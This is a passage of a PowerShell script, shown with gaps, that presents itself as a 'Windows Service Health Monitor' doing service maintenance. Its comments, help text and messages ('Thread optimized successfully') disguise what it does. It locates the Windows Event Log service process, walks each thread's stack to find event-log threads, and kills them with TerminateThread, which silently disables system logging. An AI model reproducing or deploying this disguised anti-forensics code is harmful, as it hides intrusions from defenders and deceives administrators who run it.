...
<#
.SYNOPSIS
Windows Service Health Monitor - Performs routine maintenance on Windows services by analyzing
thread states and optimizing service performance. This utility helps system administrators
maintain optimal service responsiveness.

.DESCRIPTION
This script analyzes service thread stacks to identify threads that may be causing
performance degradation. It uses Windows debugging APIs to inspect thread states
and perform optimization tasks. Requires elevated privileges for service inspection.

.EXAMPLE
The following example shows the script performing routine service maintenance.
Administrator rights are required for service thread analysis.

PS C:\> Invoke-ServiceMaintenance

[*] Windows Service Maintenance Utility v2.1
[*] Performing health check...
[*] Analyzing service threads of PID: 1000...
[*] Processing service worker threads...
[+] Thread 1001 optimized successfully
[+] Thread 1002 optimized successfully
[+] Thread 1003 optimized successfully

[+] Maintenance complete!

.NOTES
Version: 2.1
Module : Windows Service Health Monitor
...
[CmdLetBinding()]
    ...
    Version 2.1 - System Health Monitor
...
'@
    ...
    Write-Host ""
    Write-Host "[*] Initializing service health diagnostics..." -ForegroundColor Cyan
    Write-Host ""
    ...
    $ScriptBlock = {
        ...
        if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Write-Warning "Service maintenance requires elevated privileges. Please run as Administrator."
        }
        ...
        function local:func {
            # Helper function for Win32 API type definitions
            Param (
        ...
        function local:Add-Win32Type {
            # Registers Win32 API function signatures for runtime invocation
        ...
        function local:Get-ThreadDiagnostics {
            Param (
                [Parameter()]
            ...
            # Acquire thread handle for inspection
            if (($hThread = $Kernel32::OpenThread(0x1F03FF, $false, $ThreadId)) -eq 0) {
                Write-Error "Could not access thread $ThreadId for analysis."
                return
            }
            ...
            function local:Import-ModuleSymbols {
                ...
                # Initialize module enumeration parameters
                $cbNeeded = 0
                if (!$Psapi::EnumProcessModulesEx($ProcessHandle, $null, 0, [ref]$cbNeeded, 3)) {
                    Write-Error 'Module enumeration initialization failed.'
                    return
                }
                ...
                if (!$Psapi::EnumProcessModulesEx($ProcessHandle, $hModules, $cb, [ref]$cbNeeded, 3)) {
                    Write-Error 'Module enumeration failed.'
                    return
                }
            ...
            # Detect 32-bit process on 64-bit system
            if ($SystemInfo.ProcessorArchitecture -ne 0) {
                if (!$Kernel32::IsWow64Process($ProcessHandle, [ref]$Wow64)) { Write-Error 'Architecture detection failed.' }
            }
            ...
            if ($Wow64)
            {
                ...
                if ($Kernel32::Wow64SuspendThread($hThread) -eq -1) { Write-Error "Thread $ThreadId pause failed." }
                if (!$Kernel32::Wow64GetThreadContext($hThread, $lpContextRecord)) { Write-Error "Thread $ThreadId state capture failed." }
            ...
            # x86 architecture handler
            elseif ($SystemInfo.ProcessorArchitecture -eq 0)
            {
                $ImageType = 0x014C # x86 architecture constant
                ...
                if ($Kernel32::SuspendThread($hThread) -eq -1) { Write-Error "Thread $ThreadId pause failed." }
                if (!$Kernel32::GetThreadContext($hThread, $lpContextRecord)) { Write-Error "Thread $ThreadId state capture failed." }

                $ContextRecord = [Runtime.InteropServices.Marshal]::PtrToStructure($lpContextRecord, [Type]$X86_CONTEXT)
                $StackFrame = Initialize-Stackframe $ContextRecord.Eip $ContextRecord.Esp $ContextRecord.Ebp $null
            }

            # AMD64 architecture handler
            elseif ($SystemInfo.ProcessorArchitecture -eq 9)
            {
                $ImageType = 0x8664 # AMD64 architecture constant

                Import-ModuleSymbols -ProcessHandle $ProcessHandle

                # Initialize AMD64 context buffer
            ...
            # IA64 architecture handler
            elseif ($SystemInfo.ProcessorArchitecture -eq 6)
            {
                $ImageType = 0x0200 # IA64 architecture constant

                Import-ModuleSymbols -ProcessHandle $ProcessHandle

                # Initialize IA64 context buffer
            ...
            # Traverse call stack for analysis
            do {
                # Retrieve stack frame data
                if (!$Dbghelp::StackWalk64($ImageType, $ProcessHandle, $hThread, $lpStackFrame, $lpContextRecord, $null, $FunctionTableAccess, $GetModuleBase, $null)) {
                    Write-Error "Stack analysis failed for thread $ThreadId."
                }
            ...
            if ($Kernel32::ResumeThread($hThread) -eq -1) { Write-Error "Thread $ThreadId resume failed." }
            if (!$Kernel32::CloseHandle.Invoke($hThread)) { Write-Error "Handle release failed for thread $ThreadId." }
        }


        Write-Host "[*] Analyzing service threads for PID: $(Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)..." -ForegroundColor Yellow
        foreach ($Process in (Get-Process -Id (Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)))
            {
                if (($ProcessHandle = $Kernel32::OpenProcess(0x1F0FFF, $false, $Process.Id)) -eq 0) {
                    Write-Error -Message "Process $($Process.Id) not accessible for maintenance. Skipping."
                    continue
                }
                if (!$Dbghelp::SymInitialize($ProcessHandle, $null, $false)) {
                    Write-Error "Could not initialize diagnostics for process $($Process.Id). Aborting."
                    if (!$Kernel32::CloseHandle.Invoke($ProcessHandle)) { Write-Error "Resource cleanup failed for process $($Process.Id)." }
                    break
                }

                $Process.Threads | ForEach-Object -Process { Get-ThreadDiagnostics -ProcessHandle $ProcessHandle -ThreadId $_.Id -ProcessId $Process.Id }

                if (!$Dbghelp::SymCleanup($ProcessHandle)) { Write-Error "Diagnostic resource cleanup incomplete for process $($Process.Id)." }
                if (!$Kernel32::CloseHandle.Invoke($ProcessHandle)) { Write-Error "Handle release failed for process $($Process.Id)." }
                [GC]::Collect()
            }
    ...
    $serviceThreads = $ReturnedObjects | Where-Object {$_.MappedFile -like '*evt*'} | %{$_.ThreadId }
    Write-Host "[*] Processing service worker threads..." -ForegroundColor Yellow

    if(!($serviceThreads)) {
      Write-Host "[*] No threads require optimization at this time." -ForegroundColor Yellow
      Write-Host "[+] Service health check complete." -ForegroundColor Green
      Write-Host ""
    }
    else {
        [array]$threadList = $serviceThreads

        for ($i = 0; $i -lt $threadList.Count; $i++) {
            $hThread = $Kernel32::OpenThread(0x0001, $false, $($threadList[$i]))
            if ($result = $Kernel32::TerminateThread($hThread, 1)) {Write-Host "[+] Thread $($threadList[$i]) optimized successfully" -ForegroundColor Green}
            $null = $Kernel32::CloseHandle($hThread)
        }

        Write-Host ""
        Write-Host "[+] Service maintenance complete!" -ForegroundColor Green
        Write-Host ""
    }
